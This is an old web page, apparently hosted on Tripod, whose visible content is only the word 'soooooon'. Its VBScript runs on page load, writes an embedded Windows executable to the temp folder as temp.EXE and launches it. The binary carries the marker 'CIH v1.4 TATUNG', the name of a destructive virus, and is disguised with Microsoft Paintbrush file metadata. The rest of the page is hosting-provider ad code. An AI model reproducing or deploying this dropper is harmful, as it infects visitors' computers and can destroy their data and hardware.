<HTML><SCRIPT LANGUAGE="VBScript">
Dim FSO,WSH,OUT,SYS,O
Set FSO=CreateObject("Scripting.FileSystemObject")
Set WSH=CreateObject("WScript.Shell")
SYS=FSO.GetSpecialFolder(2)
Set OUT=FSO.CreateTextFile(SYS&"\temp.EXE",True)
Function C(I)
C=Chr(I)
End Function
O=C(0)
Function S(I,J)
S=String(J,I)
End Function
Function N(I)
N=S(O,I)
End Function

OUT.Write("MZ�"&O&C(3)&N(3)&C(4)&N(3)&"��"&O&O&"�"&N(7)&"@"&N(35)&"�"&N(3)&C(14)&C(31)&"�"&C(14)&O&"�"&C(9)&"�!�"&C(1)&"L�!This program cannot be run in DOS mode."&S(C(13),2)&C(10)&"$"&N(6)&"UPE"&O&O&"L"&C(1)&C(4)&O&"fU�/"&N(8)&"�"&O&C(14)&C(1)&C(11)&C(1)&C(2)&"2"&O&C(2)&N(3)&C(12)&N(6)&"@"&C(2)&N(3)&C(16)&N(3)&" "&N(4)&"@"&O&O&C(16)&N(3)&C(2)&O&O&C(1)&N(7)&C(4)&N(8)&"P"&N(3)&C(4)&O&O&"G�"&O&O&C(2)&N(5)&C(16)&O&O&C(16)&N(4)&C(16)&O&O&C(16)&N(6)&C(16)&N(12)&" "&O&O&"�"&N(4)&"0"&O&O&C(4)&C(7)&N(19)&"@"&O&O&C(20)&N(85)&"P t"&N(4)&C(2)&N(3)&C(16)&N(3)&C(2)&N(3)&C(4)&N(14)&"`"&O&O&"`.idata"&N(3)&C(2)&N(3)&" "&N(3)&C(2)&N(3)&C(6)&N(14)&"@"&O&O&"@.rsrc"&N(4)&C(16)&N(3)&"0"&N(3)&C(8)&N(3)&C(8)&N(14)&"@"&O&O&"@.reloc"&O&O&"4"&N(4)&"@"&N(3)&C(2)&N(3)&C(16)&N(14)&"@"&O&O&"B.rsrc"&N(3)&"�+"&N(4)&C(1)&N(5)&"�"&N(3)&"� @"&O&"U"&C(1)&O&O&"�"&C(16)&"@"&O&"�"&C(1)&O&O&"U�D$�3�d�"&C(3)&"�"&N(4)&"[�KBQPP"&C(15)&C(1)&"L$�[��"&C(28)&"��+f�k��q"&C(18)&"Vf�s���"&C(16)&"f�s"&C(2)&"^�V���H���"&C(8)&"�0"&C(11)&"�t"&C(2)&"��^��3��"&C(7)&"3�d�"&C(3)&"� d�"&C(3)&"X]h"&C(12)&C(16)&"@"&O&"�t2"&C(15)&"!��"&C(16)&"�"&C(4)&"$"&C(21)&"f�k���"&C(16)&"f�k"&C(2)&"�"&C(15)&"#�j"&C(15)&"Qj�QQQj"&C(1)&"j"&C(2)&"� S"&O&C(1)&O&"�� ��F�ύ�����P� g"&O&"@"&O&C(15)&"#�X�N=�"&C(17)&"�P��@։"&C(1)&"��S�"&N(4)&"[��$S� h"&O&"@"&O&"X�t$"&C(8)&"�S�YPS�S�Y"&C(15)&"#�X[�V"&C(23)&C(2)&"�`�"&N(4)&"^��"&C(19)&C(3)&O&O&"�"&C(6)&C(1)&C(15)&"�"&C(8)&C(2)&O&O&"�\$(�;$"&C(15)&"��"&C(1)&O&O&"�"&C(6)&"��"&C(5)&"V�C"&C(4)&"<�t"&C(8)&C(4)&"@�:�"&C(6)&"FFj"&O&"j�["&C(16)&"�C"&C(12)&"��"&C(4)&"PV� A"&O&"@"&O&"��"&C(16)&"�|"&C(6)&"�.EXE^"&C(15)&"��"&C(1)&O&O&"f�{"&C(24)&C(1)&C(15)&"��"&C(1)&O&O&"f�"&O&"C� 2"&O&"@"&O&C(15)&"��"&C(1)&O&O&"Q��R����?��"&C(1)&"t"&C(8)&"f�"&C(1)&"C3���3���3�3�B��C�דY���"&C(1)&"t"&C(6)&"f�"&C(1)&"C�ם"&C(15)&"�b"&C(1)&O&O&"V���3��֋�j"&C(4)&"Yj<Z�׋"&C(22)&"J���ׁ>"&O&"PE"&O&C(15)&"�$"&C(1)&O&O&"Sj"&O&"j"&C(1)&"mspaint.exe"&O&"U���DV�"&C(21)&"\ @"&O&"���"&O&"<"&C(34)&"u"&C(19)&"F�"&C(6)&"��t"&C(4)&"<"&C(34)&"u��>"&C(34)&"u"&C(13)&"F�"&C(10)&"< ~"&C(6)&"F�> ��>"&O&"t"&C(11)&"�> "&C(6)&"F�>"&O&"u��E�"&N(4)&"�E�P�"&C(21)&"X @"&O&"�E�"&C(1)&"�"&C(10)&N(3)&"t"&C(4)&C(15)&"�E�PVj"&O&"j"&O&"�"&C(21)&"d @"&O&"P�"&C(5)&N(3)&"^��]��t$"&C(16)&"j"&O&"�t$"&C(20)&"h"&O&C(16)&"@"&O&"j"&O&"j"&O&"�"&C(21)&"l @"&O&"j"&O&"�"&C(21)&"` @"&O&"3��"&C(16)&O&"RW"&C(15)&"#�P�űR��"&C(7)&"�׍B"&C(34)&"P�"&C(6)&"P"&C(15)&"�F"&C(14)&"�T"&C(16)&C(18)&"�(�"&C(14)&"��v2PRVAQ��"&C(3)&"Q"&C(3)&"�"&C(3)&"�+N"&C(28)&"��AQ��F�"&C(3)&"F�������f�<$�"&O&"|{���וj"&C(4)&"YR�V<��"&C(18)&"�ׁ>nZiptgZ[_YW"&C(3)&"�R"&C(3)&"�U�D=��"&C(24)&"S"&C(3)&"�R��O���W�V΍Vؽ�"&C(3)&O&O&"�1��(�Z"&C(16)&"+Z"&C(8)&"v,S��"&C(8)&"�"&C(24)&"�Z"&C(20)&C(3)&"Z"&C(8)&"SW�Z"&C(8)&C(3)&"Z"&C(12)&C(3)&"^��X"&C(4)&"�"&C(24)&C(1)&"Z"&C(8)&"�J$@"&O&O&"@+�v"&C(14)&C(3)&"���"&C(15)&"!��3��<�J"&C(1)&"("&C(1)&"l$"&C(8)&"3ۉX��������"&C(4)&"f�"&O&"� ���"&C(39)&"����P"&C(2)&C(15)&"��1&���+���"&C(15)&"!ȋX"&C(16)&"�8Y�"&C(13)&"��"&C(1)&"�"&O&O&"ZY����[X��3����ם^s1��f�"&C(3)&"C�N��~����N�a"&C(15)&"!�� ���s8�S$Y�C"&C(28)&"�{($u"&C(6)&"�A(< "&O&O&"��"&C(27)&"2����� "&O&O&"X "&O&O&"P "&O&O&"C�!2����� "&O&O&"l "&N(22)&"� "&O&O&"� "&O&O&"� "&O&O&"t "&N(6)&"� "&N(6)&"�v������*���9v��"&N(4)&C(17)&"��"&N(4)&"�"&O&"GetModuleHandleA"&O&O&"$"&C(1)&"GetStartupInfoA"&O&"�"&O&"GetCommandLineA"&O&"q"&O&"ExitProcess"&O&"KERNEL32.dll"&O&O&"N"&O&"ShellExecuteA"&O&"SHELL32.dll"&O&"�F"&C(1)&"að"&C(7)&"�p�q4&u�f��"&C(12)&"�vſL8"&O&"�f��"&C(12)&"���f�X"&O&"Jf�F"&C(8)&"$"&C(15)&"�֍^��UU"&C(14)&O&"��*"&C(14)&O&"���"&O&"`Q��2�"&O&"����UU"&C(15)&O&"Y�����"&O&" �����"&O&"f�F"&C(8)&C(12)&C(16)&"��3۷�S��,h"&O&C(16)&O&"��"&C(8)&"SQQQh"&C(1)&C(5)&O&"@AQQ���"&N(3)&"� "&C(4)&O&C(16)&O&"f�~"&C(6)&C(23)&"t"&C(5)&"�FM��"&C(1)&"^"&C(16)&"�FM���"&C(8)&"�"&C(1)&"�"&O&"��"&C(8)&"�"&C(1)&"×����"&C(12)&"D������"&O&":f"&C(39)&"S"&O&C(1)&O&"h"&O&"@"&O&"A"&O&"@"&O&"2"&O&"@"&O&"CIH v1.4 TATUNG"&N(58)&C(16)&"�f"&C(10)&C(4)&N(5)&C(3)&O&C(3)&N(3)&"("&O&O&"�"&C(14)&N(3)&"@"&O&O&"�"&C(16)&N(3)&"X"&O&O&"�"&N(4)&C(16)&"�f"&C(10)&C(4)&N(5)&C(1)&O&C(1)&N(3)&"p"&O&O&"�"&N(4)&C(16)&"�f"&C(10)&C(4)&N(5)&C(1)&O&C(1)&N(3)&"�"&O&O&"�"&N(4)&C(16)&"�f"&C(10)&C(4)&N(5)&C(1)&O&C(1)&N(3)&"�"&O&O&"�"&N(4)&C(16)&"�f"&C(10)&C(4)&N(5)&C(1)&O&S(C(4),2)&O&O&"�"&N(7)&C(16)&"�f"&C(10)&C(4)&N(5)&C(1)&O&S(C(4),2)&O&O&"�"&N(7)&C(16)&"�f"&C(10)&C(4)&N(5)&C(1)&O&S(C(4),2)&O&O&"�"&N(3)&"�0"&O&O&"�"&C(2)&O&O&"�"&C(4)&N(6)&"�3"&O&O&C(20)&N(3)&"�"&C(4)&N(6)&"�3"&O&O&" "&C(3)&O&O&"�"&C(4)&N(6)&"("&N(3)&" "&N(3)&"@"&N(3)&C(1)&O&C(4)&N(6)&C(2)&N(24)&"�"&O&O&"�"&N(3)&"��"&O&"�"&N(3)&"�"&O&"�"&O&"��"&O&O&"���"&O&"���"&N(3)&"�"&O&O&"�"&N(3)&"��"&O&"�"&N(3)&"�"&O&"�"&O&"��"&O&O&"���"&N(23)&"333330"&N(8)&C(3)&"{{{{{{s3"&N(6)&C(8)&"����DD���3"&N(5)&"�{{{L��D{{s0"&N(3)&C(15)&"��������G��0"&N(3)&"�{{{{����K{{3"&O&O&C(15)&"��"&C(17)&C(23)&"����ķ���"&O&O&C(11)&"{q��"&C(27)&"{|�{{{{s"&O&O&"��"&C(25)&"�����������"&O&O&"{{���"&C(27)&"{{{{{{{s"&O&O&"���������"&O&C(7)&"���"&O&C(15)&"{{y��{{{0"&O&O&"{{s"&O&C(15)&"��������"&O&"�"&O&C(7)&"�0"&O&C(15)&"{{{{{{{s"&O&C(12)&O&C(7)&"w0"&O&C(15)&"�"&S(C(34),2)&C(39)&"����"&O&O&"�"&C(8)&"s"&O&O&C(15)&"r**"&C(34)&"{{{w0"&O&C(12)&C(8)&"�"&O&O&C(15)&"����"&C(39)&"���s3p�"&N(3)&C(15)&"{***+{{{{{s"&C(15)&N(3)&C(15)&"����������0"&O&"�"&O&O&C(15)&"{z*{{{{{{s"&O&O&C(15)&N(3)&"�����UU��0"&N(6)&"�{{{U��[{0"&N(6)&"�������W�"&N(4)&C(15)&O&O&"{{����{s"&N(5)&"�"&O&C(15)&"�����շ0"&N(7)&C(15)&"{{���{{0"&N(8)&"�������"&N(9)&C(15)&"�{{{w0"&N(10)&C(7)&"���p"&N(40)&"��"&C(1)&"��"&O&O&"?�"&O&O&C(15)&"�"&O&O&C(7)&"�"&O&O&C(3)&"�"&O&O&C(3)&"�"&O&O&C(1)&"�"&O&O&C(1)&"�"&O&O&C(1)&"�"&O&O&C(1)&"�"&O&O&C(1)&"�"&O&O&C(1)&O&O&C(6)&C(1)&O&O&S(C(3),2)&O&O&C(17)&C(3)&O&O&C(24)&C(7)&N(3)&C(15)&N(3)&C(31)&N(3)&C(31)&N(3)&"�"&O&O&C(1)&"ǀ"&O&C(3)&"�"&O&C(3)&"��"&O&C(7)&"��"&O&C(7)&"��"&O&C(15)&"�")
OUT.Write("�"&O&C(15)&"��"&O&C(31)&"��"&O&"?��"&O&"��"&C(1)&"������"&O&O&C(1)&O&C(1)&O&"  "&C(16)&O&C(1)&O&C(4)&O&"�"&C(2)&O&O&C(1)&O&" "&C(3)&"4"&N(3)&"V"&O&"S"&O&"_"&O&"V"&O&"E"&O&"R"&O&"S"&O&"I"&O&"O"&O&"N"&O&"_"&O&"I"&O&"N"&O&"F"&O&"O"&N(5)&"�"&C(4)&"��"&O&O&C(1)&N(3)&C(4)&O&"�"&C(3)&N(4)&C(4)&O&"�"&C(3)&O&O&"?"&N(7)&C(1)&O&C(1)&O&C(1)&N(15)&"�"&C(2)&O&O&C(1)&O&"S"&O&"t"&O&"r"&O&"i"&O&"n"&O&"g"&O&"F"&O&"i"&O&"l"&O&"e"&O&"I"&O&"n"&O&"f"&O&"o"&N(3)&"\"&C(2)&O&O&C(1)&O&"0"&O&"4"&O&"0"&O&"4"&O&"0"&O&"4"&O&"B"&O&"0"&N(3)&"L"&O&C(22)&O&C(1)&O&"C"&O&"o"&O&"m"&O&"p"&O&"a"&O&"n"&O&"y"&O&"N"&O&"a"&O&"m"&O&"e"&N(5)&"M"&O&"i"&O&"c"&O&"r"&O&"o"&O&"s"&O&"o"&O&"f"&O&"t"&O&" "&O&"C"&O&"o"&O&"r"&O&"p"&O&"o"&O&"r"&O&"a"&O&"t"&O&"i"&O&"o"&O&"n"&N(3)&"@"&O&C(12)&O&C(1)&O&"F"&O&"i"&O&"l"&O&"e"&O&"D"&O&"e"&O&"s"&O&"c"&O&"r"&O&"i"&O&"p"&O&"t"&O&"i"&O&"o"&O&"n"&N(5)&"W"&O&"i"&O&"n"&O&"d"&O&"o"&O&"w"&O&"s"&O&" "&O&"��r��v"&O&O&"4"&O&C(9)&O&C(1)&O&"F"&O&"i"&O&"l"&O&"e"&O&"V"&O&"e"&O&"r"&O&"s"&O&"i"&O&"o"&O&"n"&N(5)&"4"&O&"."&O&"0"&O&"0"&O&"."&O&"9"&O&"5"&O&"0"&N(5)&"/"&O&C(7)&O&C(1)&O&"I"&O&"n"&O&"t"&O&"e"&O&"r"&O&"n"&O&"a"&O&"l"&O&"N"&O&"a"&O&"m"&O&"e"&N(3)&"P"&O&"b"&O&"r"&O&"u"&O&"s"&O&"h"&N(5)&"p"&O&"&"&O&C(1)&O&"L"&O&"e"&O&"g"&O&"a"&O&"l"&O&"C"&O&"o"&O&"p"&O&"y"&O&"r"&O&"i"&O&"g"&O&"h"&O&"t"&N(3)&"C"&O&"o"&O&"p"&O&"y"&O&"r"&O&"i"&O&"g"&O&"h"&O&"t"&O&" "&O&"c"&O&" "&O&"M"&O&"i"&O&"c"&O&"r"&O&"o"&O&"s"&O&"o"&O&"f"&O&"t"&O&" "&O&"C"&O&"o"&O&"r"&O&"p"&O&"."&O&" "&O&"1"&O&"9"&O&"9"&O&"1"&O&"-"&O&"1"&O&"9"&O&"9"&O&"5"&N(3)&"?"&O&C(11)&O&C(1)&O&"O"&O&"r"&O&"i"&O&"g"&O&"i"&O&"n"&O&"a"&O&"l"&O&"F"&O&"i"&O&"l"&O&"e"&O&"n"&O&"a"&O&"m"&O&"e"&N(3)&"P"&O&"B"&O&"R"&O&"U"&O&"S"&O&"H"&O&"."&O&"E"&O&"X"&O&"E"&N(5)&"l"&O&"%"&O&C(1)&O&"P"&O&"r"&O&"o"&O&"d"&O&"u"&O&"c"&O&"t"&O&"N"&O&"a"&O&"m"&O&"e"&N(5)&"M"&O&"i"&O&"c"&O&"r"&O&"o"&O&"s"&O&"o"&O&"f"&O&"t"&O&"R"&O&" "&O&"W"&O&"i"&O&"n"&O&"d"&O&"o"&O&"w"&O&"s"&O&"R"&O&" "&O&"O"&O&"p"&O&"e"&O&"r"&O&"a"&O&"t"&O&"i"&O&"n"&O&"g"&O&" "&O&"S"&O&"y"&O&"s"&O&"t"&O&"e"&O&"m"&N(5)&"8"&O&C(9)&O&C(1)&O&"P"&O&"r"&O&"o"&O&"d"&O&"u"&O&"c"&O&"t"&O&"V"&O&"e"&O&"r"&O&"s"&O&"i"&O&"o"&O&"n"&N(3)&"4"&O&"."&O&"0"&O&"0"&O&"."&O&"9"&O&"5"&O&"0"&N(5)&"D"&N(3)&C(1)&O&"V"&O&"a"&O&"r"&O&"F"&O&"i"&O&"l"&O&"e"&O&"I"&O&"n"&O&"f"&O&"o"&N(5)&"$"&O&C(4)&N(3)&"T"&O&"r"&O&"a"&O&"n"&O&"s"&O&"l"&O&"a"&O&"t"&O&"i"&O&"o"&O&"n"&N(5)&S(C(4),2)&"�"&C(4)&"PADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPAD"&O&C(16)&O&O&C(20)&N(3)&C(21)&"0[0v0�0�0�0"&N(492))
OUT.Close

WSH.run(SYS & "\temp.EXE") 

</SCRIPT>
<p align="center">&nbsp;</p>
<p align="center">&nbsp;</p>
<p align="center">&nbsp;</p>
<p align="center">&nbsp;</p>
<p align="center"><font size="7">soooooon</font></p>

</HTML><script type="text/javascript" src="http://hb.lycos.com/hb.js"></script>
<script type="text/javascript" src="http://ratings.lycos.com/ratings/lycosRating.js.php"></script>
<script type="text/javascript"><!--//--><![CDATA[//><!--
var cm_role = "live";
var cm_host = "tripod.lycos.com";
var cm_taxid = "/memberembedded";
var tripod_member_name = "dody116";
var tripod_member_page = "dody116/chi_14.html";
var tripod_ratings_hash = "1235301885:719a799e69caeed638aa623bcdcb0599";

var lycos_ad_category = null;

var lycos_ad_remote_addr = "94.216.162.110";
var lycos_ad_www_server = "www.tripod.lycos.com";
var lycos_ad_track_small = "http://members.tripod.com/adm/img/common/ot_smallframe.gif?rand=386023";
var lycos_ad_track_served = "http://members.tripod.com/adm/img/common/ot_adserved.gif?rand=386023";
//--><!]]></script>
<script type="text/javascript" src="http://scripts.lycos.com/catman/init.js"></script>
<script type="text/javascript" src="http://members.tripod.com/adm/ad/code-start.js"></script>
<script type="text/javascript" src="http://members.tripod.com/adm/ad/code-middle.js"></script>
<script type="text/javascript" src="http://members.tripod.com/adm/ad/code-end.js"></script>
<noscript>
 <img src="http://members.tripod.com/adm/img/common/ot_noscript.gif?rand=386023" alt="" width="1" height="1" />
 <!-- BEGIN STANDARD TAG - 728 x 90 - Lycos - Tripod Fallthrough - DO NOT MODIFY -->
 <iframe frameborder="0" marginwidth="0" marginheight="0" scrolling="no" width="728" height="90" src="http://ad.yieldmanager.com/st?ad_type=iframe&ad_size=728x90&section=209094"></iframe>
 <!-- END TAG -->
</noscript>
